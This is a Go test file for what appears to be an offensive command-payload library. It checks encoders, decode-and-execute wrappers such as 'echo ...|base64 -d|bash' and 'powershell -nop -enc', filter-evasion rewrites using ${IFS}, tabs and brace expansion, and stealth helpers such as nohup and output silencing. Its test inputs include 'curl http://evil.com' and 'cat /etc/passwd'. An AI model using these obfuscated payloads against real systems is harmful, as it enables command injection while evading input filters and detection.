package payload

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestNewCmd(t *testing.T) {
	cmd := NewCmd("id")
	if cmd.String() != "id" {
		t.Errorf("NewCmd(id).String() = %q", cmd.String())
	}
	if cmd.Len() != 2 {
		t.Errorf("Len() = %d, want 2", cmd.Len())
	}
	if string(cmd.Bytes()) != "id" {
		t.Errorf("Bytes() = %q", cmd.Bytes())
	}
}

func TestEncodeBase64(t *testing.T) {
	cmd := NewCmd("hello").Encode(Base64Enc)
	decoded, err := base64.StdEncoding.DecodeString(cmd.String())
	if err != nil {
		t.Fatal(err)
	}
	if string(decoded) != "hello" {
		t.Errorf("decoded = %q", decoded)
	}
}

func TestEncodeHex(t *testing.T) {
	cmd := NewCmd("AB").Encode(HexEnc)
	if cmd.String() != "4142" {
		t.Errorf("HexEnc = %q, want %q", cmd.String(), "4142")
	}
}

func TestEncodeURL(t *testing.T) {
	cmd := NewCmd("a b").Encode(URLEnc)
	if !strings.Contains(cmd.String(), "%20") {
		t.Errorf("URLEnc = %q, expected %%20", cmd.String())
	}
}

func TestEncodeDoubleURL(t *testing.T) {
	cmd := NewCmd("a b").Encode(DoubleURLEnc)
	if !strings.Contains(cmd.String(), "%2520") {
		t.Errorf("DoubleURLEnc = %q, expected %%2520", cmd.String())
	}
}

func TestEncodeROT13(t *testing.T) {
	cmd := NewCmd("hello").Encode(ROT13Enc)
	if cmd.String() != "uryyb" {
		t.Errorf("ROT13Enc = %q, want %q", cmd.String(), "uryyb")
	}
}

func TestEncodeOctal(t *testing.T) {
	cmd := NewCmd("A").Encode(OctalEnc)
	if cmd.String() != "$'\\101'" {
		t.Errorf("OctalEnc = %q, want %q", cmd.String(), "$'\\101'")
	}
}

func TestEncodeGzipBase64(t *testing.T) {
	cmd := NewCmd("hello world").Encode(GzipBase64Enc)
	if cmd.String() == "" {
		t.Error("GzipBase64Enc produced empty string")
	}
	// Should be valid base64
	if _, err := base64.StdEncoding.DecodeString(cmd.String()); err != nil {
		t.Errorf("GzipBase64Enc result is not valid base64: %v", err)
	}
}

func TestEncodeUTF16LE(t *testing.T) {
	cmd := NewCmd("A").Encode(UTF16LEEnc)
	// UTF16LE of "A" is [0x41 0x00], base64 of that is "QQAA" (with padding) or "QQA="
	if cmd.String() == "" {
		t.Error("UTF16LEEnc produced empty string")
	}
}

func TestXOR(t *testing.T) {
	cmd := NewCmd("AB").XOR([]byte{0xff})
	if cmd.String() == "" {
		t.Error("XOR produced empty string")
	}
	// Should be hex encoded
	for _, c := range cmd.String() {
		if !strings.ContainsRune("0123456789abcdef", c) {
			t.Errorf("XOR result contains non-hex char %q", c)
			break
		}
	}
}

func TestDeliverBash(t *testing.T) {
	cmd := NewCmd("aWQ=").Deliver(BashDec)
	if cmd.String() != "echo aWQ=|base64 -d|bash" {
		t.Errorf("BashDec = %q", cmd.String())
	}
}

func TestDeliverBashSubst(t *testing.T) {
	cmd := NewCmd("aWQ=").Deliver(BashSubstDec)
	want := `bash -c "$(echo aWQ=|base64 -d)"`
	if cmd.String() != want {
		t.Errorf("BashSubstDec = %q, want %q", cmd.String(), want)
	}
}

func TestDeliverHexBash(t *testing.T) {
	cmd := NewCmd("6964").Deliver(HexBashDec)
	if cmd.String() != "echo 6964|xxd -r -p|bash" {
		t.Errorf("HexBashDec = %q", cmd.String())
	}
}

func TestDeliverPython(t *testing.T) {
	cmd := NewCmd("aWQ=").Deliver(PythonDec)
	if !strings.Contains(cmd.String(), "python3") || !strings.Contains(cmd.String(), "aWQ=") {
		t.Errorf("PythonDec = %q", cmd.String())
	}
}

func TestDeliverPowerShell(t *testing.T) {
	cmd := NewCmd("data").Deliver(PowerShellDec)
	if cmd.String() != "powershell -nop -enc data" {
		t.Errorf("PowerShellDec = %q", cmd.String())
	}
}

func TestTrail(t *testing.T) {
	cmd := NewCmd("id").Trail()
	if cmd.String() != "id #" {
		t.Errorf("Trail = %q", cmd.String())
	}
}

func TestBg(t *testing.T) {
	cmd := NewCmd("id").Bg()
	if cmd.String() != "id &" {
		t.Errorf("Bg = %q", cmd.String())
	}
}

func TestNohup(t *testing.T) {
	cmd := NewCmd("id").Nohup()
	if !strings.HasPrefix(cmd.String(), "nohup id") {
		t.Errorf("Nohup = %q", cmd.String())
	}
}

func TestQuiet(t *testing.T) {
	cmd := NewCmd("id").Quiet()
	if !strings.HasSuffix(cmd.String(), ">/dev/null 2>&1") {
		t.Errorf("Quiet = %q", cmd.String())
	}
}

func TestPrependAppend(t *testing.T) {
	cmd := NewCmd("id").Prepend("sudo ").Append(" --help")
	if cmd.String() != "sudo id --help" {
		t.Errorf("Prepend+Append = %q", cmd.String())
	}
}

func TestSemiPipeAnd(t *testing.T) {
	semi := NewCmd("cd /tmp").Semi("ls").String()
	if semi != "cd /tmp; ls" {
		t.Errorf("Semi = %q", semi)
	}

	pipe := NewCmd("cat /etc/passwd").Pipe("grep root").String()
	if pipe != "cat /etc/passwd | grep root" {
		t.Errorf("Pipe = %q", pipe)
	}

	and := NewCmd("mkdir /tmp/x").And("cd /tmp/x").String()
	if and != "mkdir /tmp/x && cd /tmp/x" {
		t.Errorf("And = %q", and)
	}
}

func TestIFS(t *testing.T) {
	cmd := NewCmd("cat /etc/passwd").IFS()
	if strings.Contains(cmd.String(), " ") {
		t.Errorf("IFS still contains spaces: %q", cmd.String())
	}
	if !strings.Contains(cmd.String(), "${IFS}") {
		t.Errorf("IFS missing ${IFS}: %q", cmd.String())
	}
}

func TestTabs(t *testing.T) {
	cmd := NewCmd("cat /etc/passwd").Tabs()
	if strings.Contains(cmd.String(), " ") {
		t.Error("Tabs still contains spaces")
	}
	if !strings.Contains(cmd.String(), "\t") {
		t.Error("Tabs missing tab chars")
	}
}

func TestBraceExpand(t *testing.T) {
	cmd := NewCmd("curl http://evil.com").BraceExpand()
	if !strings.HasPrefix(cmd.String(), "{") || !strings.HasSuffix(cmd.String(), "}") {
		t.Errorf("BraceExpand = %q", cmd.String())
	}
}

func TestBraceExpandSingleWord(t *testing.T) {
	cmd := NewCmd("id").BraceExpand()
	if cmd.String() != "id" {
		t.Errorf("BraceExpand single word = %q, should be unchanged", cmd.String())
	}
}

func TestDollarQuote(t *testing.T) {
	cmd := NewCmd("id").DollarQuote()
	if !strings.HasPrefix(cmd.String(), "bash -c $'") {
		t.Errorf("DollarQuote = %q", cmd.String())
	}
}

func TestChaining(t *testing.T) {
	result := NewCmd("id").
		Encode(Base64Enc).
		Deliver(BashDec).
		Trail().
		String()
	if !strings.HasPrefix(result, "echo ") || !strings.HasSuffix(result, " #") {
		t.Errorf("chain = %q", result)
	}
}

func TestConvenienceFunctions(t *testing.T) {
	b64bash := Base64Bash("id")
	if !strings.Contains(b64bash, "base64 -d|bash") {
		t.Errorf("Base64Bash = %q", b64bash)
	}

	b64bashc := Base64BashC("id")
	if !strings.Contains(b64bashc, `bash -c "$(echo`) {
		t.Errorf("Base64BashC = %q", b64bashc)
	}

	hexbash := HexBash("id")
	if !strings.Contains(hexbash, "xxd -r -p|bash") {
		t.Errorf("HexBash = %q", hexbash)
	}

	trail := CommentTrail("cmd")
	if trail != "cmd #" {
		t.Errorf("CommentTrail = %q", trail)
	}

	bg := BackgroundExec("cmd")
	if bg != "cmd &" {
		t.Errorf("BackgroundExec = %q", bg)
	}

	nohup := NohupExec("cmd")
	if !strings.HasPrefix(nohup, "nohup cmd") {
		t.Errorf("NohupExec = %q", nohup)
	}

	semi := SemicolonChain("a", "b", "c")
	if semi != "a; b; c" {
		t.Errorf("SemicolonChain = %q", semi)
	}

	pipes := PipeChain("a", "b")
	if pipes != "a | b" {
		t.Errorf("PipeChain = %q", pipes)
	}
}

func TestURLEncodeStr(t *testing.T) {
	got := URLEncodeStr("a b")
	if !strings.Contains(got, "%20") {
		t.Errorf("URLEncodeStr = %q", got)
	}
}

func TestDoubleURLEncodeStr(t *testing.T) {
	got := DoubleURLEncodeStr("a b")
	if !strings.Contains(got, "%2520") {
		t.Errorf("DoubleURLEncodeStr = %q", got)
	}
}
